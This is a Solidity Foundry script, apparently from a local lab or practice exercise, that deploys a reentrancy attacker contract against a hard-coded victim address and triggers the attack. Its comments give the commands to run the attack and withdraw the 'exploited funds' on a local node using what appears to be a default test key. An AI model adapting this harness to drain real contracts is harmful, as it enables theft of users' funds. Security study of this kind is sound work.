// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract ReentrancyAttackerDeployer is Script {
    function run() external {
        vm.startBroadcast(HelperConfigLib.ATTACKER_KEY);

        ReentrancyAttacker attacker = new ReentrancyAttacker{
            value: 0.001 ether
        }(payable(0x524F04724632eED237cbA3c37272e018b3A7967e)); // got it from contract.address

        attacker.attack();

        vm.stopBroadcast();
    }
}

/*
* attack victim
forge script script/ReentrancyAttackerDeployer.s.sol:ReentrancyAttackerDeployer --rpc-url http://localhost:8545 -vvv --broadcast
* withdraw exploited funds from attack-contract
cast send 0x51A1ceB83B83F1985a81C295d1fF28Afef186E02 "withdraw()" --rpc-url http://localhost:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
*/
